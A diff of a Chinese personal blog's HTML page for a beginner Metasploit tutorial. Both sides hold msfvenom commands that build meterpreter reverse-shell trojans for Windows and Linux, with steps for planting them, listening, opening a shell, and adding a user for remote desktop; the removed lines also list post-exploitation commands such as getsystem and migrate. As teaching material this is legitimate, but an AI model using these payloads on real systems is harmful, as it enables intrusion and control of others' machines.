@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 123msfven">
+<meta name="description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
 <meta name="keywords" content="Metasploit">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Metasploit(MSF)入门">
 <meta property="og:url" content="https://jeremyekek.github.io/2019/03/14/Metasploit-MSF/index.html">
 <meta property="og:site_name" content="EkEk的个人博客">
-<meta property="og:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 123msfven">
+<meta property="og:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-07-23T07:05:19.564Z">
+<meta property="og:updated_time" content="2020-09-05T16:14:18.563Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Metasploit(MSF)入门">
-<meta name="twitter:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 123msfven">
+<meta name="twitter:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
 
 
 
@@ -285,8 +285,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-23T15:05:19+08:00">
-                2019-07-23
+              <time title="更新于" itemprop="dateModified" datetime="2020-09-06T00:14:18+08:00">
+                2020-09-06
               </time>
             
           </span>
@@ -362,9 +362,9 @@
 </li>
 </ol>
 <h2 id="三、生成木马程序"><a href="#三、生成木马程序" class="headerlink" title="三、生成木马程序"></a>三、生成木马程序</h2><p>利用MSF生成木马获取meterpreter反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.131 lport=4444 -f exe -a x86 --platform win -o shell.exe</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.59.128 LPORT=6666 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p  	选用什么payload</span><br><span class="line">lhost  	监听ip</span><br><span class="line">lport  	监听端口</span><br><span class="line">-a		系统位数</span><br><span class="line">-f  	生成文件的类型</span><br><span class="line">-o		输出</span><br></pre></td></tr></table></figure>
+<p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p>
 <h2 id="四、投放木马到目标机上"><a href="#四、投放木马到目标机上" class="headerlink" title="四、投放木马到目标机上"></a>四、投放木马到目标机上</h2><h2 id="五、开启监听"><a href="#五、开启监听" class="headerlink" title="五、开启监听"></a>五、开启监听</h2><p>启用MSF，具体操作如下：</p>
 <ol>
 <li><p>加载expuse </p>
@@ -388,12 +388,7 @@
 <li><p>执行shell 进到被攻击者电脑的终端</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>其他命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat</span><br><span class="line">getpwd</span><br><span class="line">ls</span><br><span class="line">upload</span><br><span class="line">download</span><br><span class="line">ps</span><br><span class="line">getpid</span><br><span class="line">migrate</span><br><span class="line">sysinfo</span><br><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">run 脚本</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ol start="3">
-<li><p>添加添加用户  开机3389 连接桌面</p>
+<li><p>添加添加用户  开机3389 连接桌面(</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
@@ -437,8 +432,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/03/14/域环境搭建/" rel="prev" title="域环境搭建">
-                域环境搭建 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/" rel="prev" title="CVE-2018-20250-WinRAR远程代码执行漏洞">
+                CVE-2018-20250-WinRAR远程代码执行漏洞 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -526,7 +521,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -537,7 +532,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -548,7 +543,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -760,7 +755,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-snowflake-o"></i>
   </span>
